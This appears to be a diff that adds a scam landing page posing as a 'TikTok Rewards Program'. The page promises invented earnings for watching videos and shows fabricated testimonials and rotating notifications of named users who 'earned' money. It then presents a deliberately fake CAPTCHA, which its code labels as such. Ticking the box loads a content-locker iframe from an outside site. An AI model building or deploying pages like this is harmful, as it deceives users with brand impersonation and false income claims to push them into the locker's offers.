+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+</div>
+</div>
+</div>
+<p class="testimonial-quote">"I love the design and simplicity. The daily rewards keep me motivated."</p>
+</div>
+</div>
+</div>
+</section>
+<!-- Earnings Calculator Section -->
+<section class="section">
+<div class="container">
+<div class="earnings-card reveal">
+<div class="earnings-card-header">
+<svg class="earnings-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+<polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline>
+<polyline points="17 6 23 6 23 12"></polyline>
+</svg>
+<h2 class="earnings-card-title">Your Estimated Weekly Earnings</h2>
+</div>
+<div class="earnings-card-amount">$1000</div>
+<p class="earnings-card-subtitle">Based on average viewing activity</p>
+<div class="earnings-card-stats">
+<div class="earnings-card-stat">
+<div class="earnings-card-stat-value">50+</div>
+<div class="earnings-card-stat-label">Videos/Day</div>
+</div>
+<div class="earnings-card-stat">
+<div class="earnings-card-stat-value">$0.50</div>
+<div class="earnings-card-stat-label">Per Video</div>
+</div>
+<div class="earnings-card-stat">
+<div class="earnings-card-stat-value">24hrs</div>
+<div class="earnings-card-stat-label">Payout Time</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<!-- Footer -->
+<footer class="footer">
+<div class="container">
+<p class="footer-text reveal">
+The TikTok Rewards Program is currently in early access. Limited spots available for new users.
+</p>
+<div class="footer-links reveal" style="transition-delay: 0.1s;">
+<a href="#" class="footer-link">Privacy Policy</a>
+<span class="footer-separator">·</span>
+<a href="#" class="footer-link">Terms</a>
+<span class="footer-separator">·</span>
+<a href="#" class="footer-link">Support</a>
+</div>
+</div>
+</footer>
+</main>
+<!-- First Modal - Earnings -->
+<div class="modal-overlay" id="earningsModal">
+<div class="modal-content">
+<button class="modal-close" id="closeModal">
+<svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+<path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+</svg>
+</button>
+<h3 class="modal-title">You could have earned today:</h3>
+<div class="modal-amount">$110.46</div>
+<p class="modal-disclaimer">Estimate based on your viewing activity potential. Resets at midnight.</p>
+<button class="btn" id="startNow">
+Start Now
+<svg width="20" height="20" viewBox="0 0 20 20" fill="none" style="margin-left: 8px;">
+<path d="M4 10H16M16 10L10 4M16 10L10 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</button>
+</div>
+</div>
+<!-- Second Modal - Fake Captcha -->
+<div class="captcha-overlay" id="captchaModal">
+<div class="captcha-content">
+<button class="captcha-close" id="closeCaptcha">&times;</button>
+<h3 class="captcha-title">Verify to activate monetization on your TikTok account</h3>
+<div class="captcha-box" id="captchaBox">
+<div class="captcha-checkbox" id="captchaCheckbox"></div>
+<label class="captcha-label" id="captchaLabel">I'm not a robot</label>
+<div class="captcha-brand">
+<div class="captcha-logo"></div>
+<span class="captcha-logo-text">CAPTCHA</span>
+</div>
+</div>
+<div class="captcha-links">
+<a href="#">Privacy</a>
+<a href="#">Terms</a>
+</div>
+</div>
+</div>
+<script>
+// Notification data
+const notifications = [
+{ name: "Grace A.", amount: 1376, initials: "GA", color: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)" },
+{ name: "Benjamin E.", amount: 1000, initials: "BE", color: "linear-gradient(135deg, #f093fb 0%, #f5576c 100%)" },
+{ name: "Logan U.", amount: 1262, initials: "LU", color: "linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)" },
+{ name: "Sophia L.", amount: 1633, initials: "SL", color: "linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)" },
+{ name: "Jackson B.", amount: 1154, initials: "JB", color: "linear-gradient(135deg, #fa709a 0%, #fee140 100%)" },
+{ name: "Madison N.", amount: 1421, initials: "MN", color: "linear-gradient(135deg, #30cfd0 0%, #330867 100%)" },
+{ name: "Emma S.", amount: 1089, initials: "ES", color: "linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)" },
+{ name: "Jayden Q.", amount: 1376, initials: "JQ", color: "linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%)" },
+{ name: "Aiden G.", amount: 1523, initials: "AG", color: "linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)" },
+{ name: "Charlotte F.", amount: 1187, initials: "CF", color: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)" },
+{ name: "Tyler J.", amount: 1456, initials: "TJ", color: "linear-gradient(135deg, #f093fb 0%, #f5576c 100%)" },
+{ name: "Mia H.", amount: 1321, initials: "MH", color: "linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)" },
+{ name: "Ethan W.", amount: 1602, initials: "EW", color: "linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)" },
+{ name: "Chloe N.", amount: 1098, initials: "CN", color: "linear-gradient(135deg, #fa709a 0%, #fee140 100%)" },
+{ name: "Isabella C.", amount: 1478, initials: "IC", color: "linear-gradient(135deg, #30cfd0 0%, #330867 100%)" },
+{ name: "Ella X.", amount: 1000, initials: "EX", color: "linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)" },
+];
+// Create notification HTML
+function createNotificationCard(notification) {
+return `
+<div class="notification-card">
+<div class="notification-avatar" style="background: ${notification.color}">
+${notification.initials}
+</div>
+<div class="notification-text">
+<div class="notification-name">${notification.name}</div>
+<div class="notification-amount">earned <span>$${notification.amount.toLocaleString()}</span> this week</div>
+</div>
+</div>
+`;
+}
+// Populate sidebar
+const scrollContainer = document.getElementById('notificationScroll');
+const allNotifications = [...notifications, ...notifications];
+scrollContainer.innerHTML = allNotifications.map(createNotificationCard).join('');
+// Scroll reveal animation
+const revealElements = document.querySelectorAll('.reveal');
+const revealObserver = new IntersectionObserver((entries) => {
+entries.forEach(entry => {
+if (entry.isIntersecting) {
+entry.target.classList.add('active');
+revealObserver.unobserve(entry.target);
+}
+});
+}, {
+threshold: 0.2,
+rootMargin: '0px 0px -50px 0px'
+});
+revealElements.forEach(el => revealObserver.observe(el));
+// Modal functionality
+const earningsModal = document.getElementById('earningsModal');
+const captchaModal = document.getElementById('captchaModal');
+const form = document.getElementById('earningsForm');
+const closeModalBtn = document.getElementById('closeModal');
+const startNowBtn = document.getElementById('startNow');
+const closeCaptchaBtn = document.getElementById('closeCaptcha');
+const usernameInput = document.getElementById('usernameInput');
+// Form submit - Show first modal
+form.addEventListener('submit', (e) => {
+e.preventDefault();
+if (usernameInput.value.trim()) {
+earningsModal.classList.add('active');
+}
+});
+// Close first modal
+closeModalBtn.addEventListener('click', () => {
+earningsModal.classList.remove('active');
+});
+// Start Now button - Show captcha modal
+startNowBtn.addEventListener('click', () => {
+earningsModal.classList.remove('active');
+setTimeout(() => {
+captchaModal.classList.add('active');
+}, 300);
+});
+// Close captcha modal
+closeCaptchaBtn.addEventListener('click', () => {
+captchaModal.classList.remove('active');
+});
+// Close modals on outside click
+earningsModal.addEventListener('click', (e) => {
+if (e.target === earningsModal) {
+earningsModal.classList.remove('active');
+}
+});
+captchaModal.addEventListener('click', (e) => {
+if (e.target === captchaModal) {
+captchaModal.classList.remove('active');
+}
+});
+// Close modals on Escape key
+document.addEventListener('keydown', (e) => {
+if (e.key === 'Escape') {
+earningsModal.classList.remove('active');
+captchaModal.classList.remove('active');
+}
+});
+// Captcha checkbox functionality (FAKE CAPTCHA)
+const captchaCheckbox = document.getElementById('captchaCheckbox');
+const captchaLabel = document.getElementById('captchaLabel');
+const captchaBox = document.getElementById('captchaBox');
+function toggleCaptcha() {
+captchaCheckbox.classList.toggle('checked');
+if (captchaCheckbox.classList.contains('checked')) {
+setTimeout(() => {
+// Close captcha modal
+captchaModal.classList.remove('active');
+// Show content locker
+const iframeContainer = document.getElementById('iframeContainer');
+const lockerIframe = document.getElementById('lockerIframe');
+lockerIframe.src = 'https://unlock-file.com/?2191474';
+iframeContainer.style.display = 'block';
+// Scroll to locker
+iframeContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}, 800);
+}
+}
+captchaCheckbox.addEventListener('click', toggleCaptcha);
+captchaLabel.addEventListener('click', toggleCaptcha);
+captchaBox.addEventListener('click', (e) => {
+if (e.target === captchaBox) toggleCaptcha();
+});
+// Bottom Notifications - Show random notifications
+const bottomNotificationsContainer = document.getElementById('bottomNotifications');
+const bottomNotificationData = [
+{ name: "Aiden G.", amount: 1276 },
+{ name: "Mia H.", amount: 1712 },
+{ name: "Noah P.", amount: 1456 },
+{ name: "Lily R.", amount: 1890 },
+{ name: "Lucas T.", amount: 1321 },
+{ name: "Zoe K.", amount: 1567 },
+];
+function createBottomNotification(data) {
+const div = document.createElement('div');
+div.className = 'bottom-notification-card';
+div.innerHTML = `
+<div class="bottom-notification-name">${data.name}</div>
+<div class="bottom-notification-text">earned <span>$${data.amount.toLocaleString()}</span> this week</div>
+`;
+return div;
+}
+function showBottomNotification() {
+bottomNotificationsContainer.innerHTML = '';
+const shuffled = [...bottomNotificationData].sort(() => 0.5 - Math.random());
+const selected = shuffled.slice(0, 2);
+selected.forEach((data, index) => {
+setTimeout(() => {
+const notification = createBottomNotification(data);
+bottomNotificationsContainer.appendChild(notification);
+setTimeout(() => {
+notification.style.opacity = '0';
+notification.style.transform = 'translateX(-50px)';
+notification.style.transition = 'all 0.5s ease';
+setTimeout(() => notification.remove(), 500);
+}, 5000);
+}, index * 200);
+});
+}
+// Show initial notifications
+showBottomNotification();
+// Rotate notifications every 8 seconds
+setInterval(showBottomNotification, 8000);
+</script>
+</body>
+</html>
